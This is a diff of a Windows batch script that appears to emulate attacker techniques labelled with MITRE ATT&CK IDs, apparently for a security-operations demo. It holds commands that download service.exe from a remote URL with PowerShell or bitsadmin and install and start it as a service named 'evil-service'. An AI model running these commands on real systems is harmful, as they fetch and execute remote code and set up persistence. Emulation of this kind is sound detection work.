@@ -46,7 +46,7 @@ fodhelper.exe
 ::echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] T1197 - Bitsadmin Download executable file
 echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] T1050 - Service Installation
 ::bitsadmin.exe /transfer /Download /priority Foreground https://github.com/dunghoangtrong/hsoc-demo/blob/master/service.exe?raw=true %temp%\service.exe
-powershell -c invoke-webrequest https://github.com/dunghoangtrong/hsoc-demo/blob/master/service.exe?raw=true %temp%\service.exe
+powershell -c Invoke-WebRequest -Uri "https://github.com/dunghoangtrong/hsoc-demo/blob/master/service.exe?raw=true" -OutFile "%temp%\service.exe"
 sc.exe create evil-service binPath= %temp%\service.exe
 sc.exe start evil-service
 ::timeout 5
